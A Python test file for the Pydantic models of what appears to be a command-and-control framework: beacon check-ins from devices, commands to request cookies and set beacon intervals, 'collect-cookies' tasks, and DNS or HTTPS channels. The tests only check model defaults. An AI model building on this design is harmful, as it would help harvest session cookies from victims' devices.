"""Tests for Pydantic models."""

import pytest
from datetime import datetime, timezone

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from models import (
    BeaconCheckIn,
    CommandMessage,
    CommandType,
    DeviceInfo,
    ResponseMessage,
    ResponseStatus,
    ServerConfig,
    TaskResponse,
    TaskResult,
)


# ---------------------------------------------------------------------------
# CommandMessage
# ---------------------------------------------------------------------------

class TestCommandMessage:
    """Tests for the CommandMessage model."""

    def test_create_with_defaults(self) -> None:
        msg = CommandMessage(command=CommandType.SHOW_DEVICES)
        assert msg.command == CommandType.SHOW_DEVICES
        assert msg.args == {}
        assert msg.request_id  # auto-generated UUID
        assert msg.timestamp  # auto-generated

    def test_create_with_args(self) -> None:
        msg = CommandMessage(
            command=CommandType.SET_BEACON_INTERVAL,
            args={"interval": 8},
        )
        assert msg.args == {"interval": 8}

    def test_create_with_explicit_request_id(self) -> None:
        msg = CommandMessage(
            request_id="custom-id",
            command=CommandType.REQUEST_COOKIES,
        )
        assert msg.request_id == "custom-id"

    def test_invalid_command_raises(self) -> None:
        with pytest.raises(ValueError):
            CommandMessage(command="not-a-command")

    def test_serialise_round_trip(self) -> None:
        msg = CommandMessage(command=CommandType.SHOW_DEVICES)
        data = msg.model_dump(mode="json")
        restored = CommandMessage(**data)
        assert restored.command == msg.command
        assert restored.request_id == msg.request_id


# ---------------------------------------------------------------------------
# ResponseMessage
# ---------------------------------------------------------------------------

class TestResponseMessage:
    """Tests for the ResponseMessage model."""

    def test_success_response(self) -> None:
        resp = ResponseMessage(
            request_id="abc",
            command=CommandType.SHOW_DEVICES,
            status=ResponseStatus.SUCCESS,
            message="OK",
        )
        assert resp.status == ResponseStatus.SUCCESS
        assert resp.data == {}

    def test_error_response_with_data(self) -> None:
        resp = ResponseMessage(
            request_id="xyz",
            command=CommandType.REQUEST_COOKIES,
            status=ResponseStatus.ERROR,
            data={"detail": "something broke"},
            message="failure",
        )
        assert resp.status == ResponseStatus.ERROR
        assert resp.data["detail"] == "something broke"


# ---------------------------------------------------------------------------
# BeaconCheckIn
# ---------------------------------------------------------------------------

class TestBeaconCheckIn:
    """Tests for the BeaconCheckIn model."""

    def test_minimal_check_in(self) -> None:
        ci = BeaconCheckIn(device_name="dev1", ip_address="10.0.0.1")
        assert ci.device_name == "dev1"
        assert ci.cookies == {}
        assert ci.os_info == ""

    def test_full_check_in(self) -> None:
        ci = BeaconCheckIn(
            device_name="dev1",
            ip_address="10.0.0.1",
            os_info="Linux 6.1",
            cookies={"sid": "val"},
        )
        assert ci.os_info == "Linux 6.1"
        assert ci.cookies == {"sid": "val"}


# ---------------------------------------------------------------------------
# DeviceInfo
# ---------------------------------------------------------------------------

class TestDeviceInfo:
    """Tests for the DeviceInfo model."""

    def test_defaults(self) -> None:
        d = DeviceInfo(name="alpha", ip="1.2.3.4")
        assert d.status == "online"
        assert d.cookies == {}
        assert isinstance(d.last_seen, datetime)

    def test_custom_values(self) -> None:
        d = DeviceInfo(
            name="beta",
            ip="5.6.7.8",
            status="offline",
            os_info="Windows 11",
        )
        assert d.status == "offline"
        assert d.os_info == "Windows 11"


# ---------------------------------------------------------------------------
# ServerConfig
# ---------------------------------------------------------------------------

class TestServerConfig:
    """Tests for the ServerConfig model."""

    def test_defaults(self) -> None:
        cfg = ServerConfig()
        assert cfg.beacon_interval == 2
        assert cfg.communication_protocol == "https"

    def test_custom_values(self) -> None:
        cfg = ServerConfig(beacon_interval=32, communication_protocol="dns")
        assert cfg.beacon_interval == 32
        assert cfg.communication_protocol == "dns"


# ---------------------------------------------------------------------------
# TaskResponse / TaskResult
# ---------------------------------------------------------------------------

class TestTaskResponse:
    """Tests for the TaskResponse model."""

    def test_defaults(self) -> None:
        t = TaskResponse(task_type="collect-cookies")
        assert t.task_id  # auto-generated
        assert t.parameters == {}


class TestTaskResult:
    """Tests for the TaskResult model."""

    def test_basic(self) -> None:
        r = TaskResult(
            task_id="tid-1",
            device_name="dev1",
            success=True,
            data={"cookies": {"a": "b"}},
        )
        assert r.success is True
        assert r.data["cookies"]["a"] == "b"

    def test_failure(self) -> None:
        r = TaskResult(
            task_id="tid-2",
            device_name="dev2",
            success=False,
        )
        assert r.success is False
        assert r.data == {}
